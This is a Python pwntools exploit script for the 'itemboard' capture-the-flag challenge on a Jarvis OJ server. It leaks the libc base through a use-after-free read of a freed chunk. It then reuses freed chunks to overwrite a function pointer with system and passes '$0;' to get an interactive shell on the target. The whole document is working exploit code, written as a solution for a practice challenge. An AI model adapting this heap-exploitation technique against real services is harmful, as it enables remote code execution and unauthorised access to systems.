#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./itemboard")
    elf = ELF("./itemboard")
    libc = elf.libc
    main_arena = 0x399b00

else:
    io = remote("pwn2.jarvisoj.com", 9887)
    elf = ELF("./itemboard")
    libc = ELF("./libc-2.19.so")
    main_arena = 0x3be760


def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def add(name, length, des):
    io.sendlineafter(":\n", "1")
    io.sendlineafter("?\n", name)
    io.sendlineafter("?\n", str(length))
    io.sendlineafter("?\n", des)

def show(idx):
    io.sendlineafter(":\n", "3")
    io.sendlineafter("?\n", str(idx))

def remove(idx):
    io.sendlineafter(":\n", "4")
    io.sendlineafter("?\n", str(idx))

if __name__ == "__main__":
    #  add('a' * 30, 0x80, 'a' * 8)
    add('aaaa', 0x80, 'aaaa')
    add('bbbb', 0x80, 'bbbb')
    remove(0)
    #  DEBUG()
    show(0)

    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - 88 - main_arena
    success("libcBase -> {:#x}".format(libcBase))
    pause()

    remove(1)
    add('cccc', 32, 'cccc')
    add('dddd', 32, 'dddd')
    remove(2)
    remove(3)
    add('eeee', 24, "$0;" + "eeeeeeeeeeeee" + p64(libcBase + libc.sym["system"]))
    remove(2)

    io.interactive()
    io.close()
